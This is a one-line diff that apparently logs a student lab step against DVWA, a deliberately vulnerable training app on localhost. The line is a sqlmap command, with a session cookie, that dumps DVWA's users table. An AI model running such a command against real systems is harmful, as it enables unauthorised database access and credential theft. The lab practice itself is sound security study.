@@ -1,0 +1,1 @@
+http://localhost:80/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://localhost:80/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=PHPSESSID=rs2deembn27ak3ud79t7cs5k44; security=low" --batch -D dvwa -T users --dump --output-dir=/home/kali/Desktop/SSII-PAI/PAI_5/03-Escaneo/sqlmap-output/
